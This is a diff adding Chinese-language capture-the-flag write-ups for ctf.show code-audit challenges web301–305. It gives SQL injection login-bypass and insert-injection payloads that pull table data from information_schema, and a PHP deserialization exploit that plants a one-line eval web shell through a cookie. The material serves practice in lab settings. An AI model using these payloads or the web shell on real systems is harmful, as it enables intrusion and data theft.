@@ -428,7 +428,7 @@ if(isset($_GET['c'])){
 
 ### web41
 
-```
+```php
 <?php
 
 /*
@@ -493,7 +493,7 @@ POST请求，上bp
 
 ### web43
 
-```
+```php
 <?php
 
 /*
@@ -1540,7 +1540,7 @@ $sql = "select username,password from user where username !='flag' and id = '".$
 sqlmap -u "http://cde6efe9-40f8-430c-9698-5cdac62609b6.challenge.ctf.show/?id=1" --dbs --batch
 ```
 
-想多了，别人把GET请求隔离了，专门放CSRF攻击的。
+想多了，别人把GET请求隔离了，专门防CSRF攻击的。
 
 
 
@@ -2063,6 +2063,270 @@ for i in range(100):
 
 
 
+
+## 代码审计
+
+### web301
+
+审计代码，首先打开靶机，发现了一个后台登录界面。
+
+面对登录，可能的思路为弱口令（一般CTF题）和SQL注入（某私有云数据中心）
+
+> 但是，弱口令一般都不会是首选，除非对方明确告诉你了可能要爆破。
+>
+> 原因如下：
+>
+> - 容器分配的资源有限，可能经不住过高速率的爆破，但如果出题人不提示，那就不是解题人的错。
+> - 爆破本身可以算对服务器的DOS攻击，任由他人爆破可能会造成潜在不良后果。
+
+打开源码文件，发现sql数据库。
+
+好吧，这下就锁死是SQL注入了。
+
+先看login.php这个我们一打开靶机就会看到的。
+
+根据代码：
+
+```html
+<form class="am-form" action="checklogin.php" method="post" >
+```
+
+寻找checklogin.php，从
+
+```php
+require 'conn.php';
+```
+
+打开conn.php，发现是后端数据库的登录信息，但很遗憾，密码是不可见的。
+
+![第一步有些出师不利](.\代码审计\web301\数据库关键信息不明.png)
+
+回到checklogin.php，可以看到文件中写明了
+
+```php
+$sql="select sds_password from sds_user where sds_username='".$username."' order by id limit 1;";
+```
+
+说明只用查一列，而且接下来的代码显示如果没有查询结果或结果不匹配，则返回错误。
+
+操作对象： username
+
+从手动注入开始过一遍流程：
+
+1. 确认只有一列，那就用union select 1
+2. 为了让前方代码闭合，最前面加个‘， 变成 ‘ union select 1
+3. 为了确保能够正确执行，结尾加个 # 注释后面内容
+
+故得到payload:
+
+```
+username: ' union select 1 #
+password: 1  // 和上面的1对应
+```
+
+进入后台，得到flag
+
+![成功](.\代码审计\web301\登录成功.png)
+
+### web302
+
+修改的地方：
+
+```
+if(!strcasecmp(sds_decode($userpwd),$row['sds_password']))
+```
+
+也就是userpwd这个属性被加密了，先输入加密的结果，password是明文。
+
+寻找一下，在fun.php中找到了加密函数
+
+```php
+<?php
+function sds_decode($str){
+	return md5(md5($str.md5(base64_encode("sds")))."sds");
+}
+?>
+```
+
+稍做修改
+
+```php
+<?php
+	$str = 1;
+	echo md5(md5($str.md5(base64_encode("sds")))."sds");
+?>
+```
+
+得到结果为：
+
+```
+d9c77c4e454869d5d8da3b4be79694d3
+```
+
+重新构建payload:
+
+```
+username: ' union select 'd9c77c4e454869d5d8da3b4be79694d3' #
+password: 1
+```
+
+又进去了
+
+![成功](.\代码审计\web302\flag.png)
+
+
+
+### web303
+
+又是数据库，不过这次管理员分出来了。
+
+```php
+if(strlen($username)>6){
+	die();
+}
+```
+
+说明username字符不能大于6，这不明摆着写admin吗？
+
+这次给了user数据库，看了一下，就一个user， 序号1， 叫admin，密码加密存着
+
+```sql
+INSERT INTO `sds_user` VALUES ('1', 'admin', '27151b7b1ad51a38ea66b1529cde5ee4');
+```
+
+这个加密值我就猜admin了，通过本地php环境验证，还真是。
+
+打开靶机先登录，登录身份为管理员，但没找到flag……
+
+那就只能从另一个数据库dpt.sql下手了。
+
+在网页前端操作网点菜单时跳出以下内容：
+
+```sql
+insert into sds_dpt set sds_name='',sds_address ='',sds_build_date='',sds_have_safe_card='1',sds_safe_card_num='',sds_telephone='';Incorrect datetime value: '' for column `sds`.`sds_dpt`.`sds_build_date` at row 1
+```
+
+那就只能用这个报错信息注入了：
+
+```sql
+# dptadd.php中传入参数没有过滤，存在insert注入
+$sql="insert into sds_dpt set 
+sds_name='".$dpt_name."',sds_address ='".$dpt_address."',sds_build_date='".$dpt_build_year."',sds_have_safe_card='".$dpt_has_cert."',sds_safe_card_num='".$dpt_cert_number."',sds_telephone='".$dpt_telephone_number."';";
+$result=$mysqli->query($sql);
+echo $sql;
+```
+
+手动操作步骤如下：
+
+1. 对dpt_name，先输入1‘,闭合函数
+2. 然后，再接上sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database()) #以查询表名。得到结果为sds_dpt, sds_fl9g, sds_user，重点在sds_fl9g
+3. 接着，再接上sds_address=(select group_concat(column_name) from information_schema.columns where table_name = 'sds_fl9g') #,查询表sds_fl9g的列名，得到结果为flag
+4. 最后，再接上sds_address=(select flag from sds_fl9g) #， 得到flag的值
+
+![成功](.\代码审计\web303\flag.png)
+
+
+
+### web304
+
+给的源码中没找到waf，网页测试中也没过滤，只是将数据库名改为了sds_flaag
+
+啥东西？
+
+![成功](F:\CTFShow-Web\Web入门\代码审计\web304\flag.png)
+
+
+
+### web305（getshell但卡了……）
+
+前面同web303-304，admin/admin进入后台。
+
+然后发现了waf
+
+```php
+function sds_waf($str){
+	if(preg_match('/\~|\`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\{|\}|\[|\]|\;|\:|\'|\"|\,|\.|\?|\/|\\\|\<|\>/', $str)){
+		return false;
+	}else{
+		return true;
+	}
+}
+```
+
+也就是说所有的sql必要字符都被过滤了，不要想着在这里搞事。
+
+再找找新的东西。
+
+```php
+$user_cookie = $_COOKIE['user'];
+if(isset($user_cookie)){
+	$user = unserialize($user_cookie);
+}
+```
+
+哦？反序列化？
+
+查看class.php
+
+```php
+class user{
+	public $username;
+	public $password;
+	public function __construct($u,$p){
+		$this->username=$u;
+		$this->password=$p;
+	}
+	public function __destruct(){
+		file_put_contents($this->username, $this->password);
+	}
+```
+
+那就没什么好说的了，file_put_content会将后面的内容写入前面。准备挂马。
+
+```
+class user{
+    public $username;
+    public $password;
+    public function __construct($u,$p){
+        $this->username=$u;
+        $this->password=$p;
+    }
+    public function __destruct(){
+        file_put_contents($this->username, $this->password);
+    }
+}
+
+$ctfshow = new user('a.php','<?php eval($_POST[1]);?>');
+var_dump(urlencode(serialize($ctfshow)));
+```
+
+得到结果为：
+
+```
+O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22a.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D
+```
+
+通过名为user的cookie传入。
+
+![](.\代码审计\web305\挂马.png)
+
+antsword连接发现只有源代码……flag呢？
+
+看来flag挂在sql上了。
+
+更改为数据库连接模式
+
+![](.\代码审计\web305\数据库连接.png)
+
+
+
+SELECT `flag` FROM `sds_flabag` ORDER BY 1 DESC LIMIT 0,20;
+
+然后卡了……我去。
+
+
+
+### web306
 
 
 
